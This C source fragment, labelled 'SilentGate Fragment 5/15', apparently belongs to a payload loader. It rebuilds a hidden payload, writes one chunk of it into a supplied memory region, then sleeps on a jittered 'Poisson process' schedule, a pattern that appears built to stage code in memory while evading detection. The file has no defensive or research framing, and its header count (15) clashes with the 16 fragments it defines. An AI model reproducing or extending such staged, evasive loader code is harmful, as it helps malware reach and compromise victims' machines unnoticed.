/*
 * SilentGate Fragment 5/15
 * Offset: 37430 bytes  Size: 7486 bytes
 * Schedule: t=447ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   5
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  119778
#define CHUNK_OFFSET  37430
#define CHUNK_SIZE    7486
#define SLEEP_NEXT_MS 447

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 5: Write chunk 5 */
void sg_execute_fragment_5(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 5] Writing chunk at t=447ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 5] Chunk 5 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
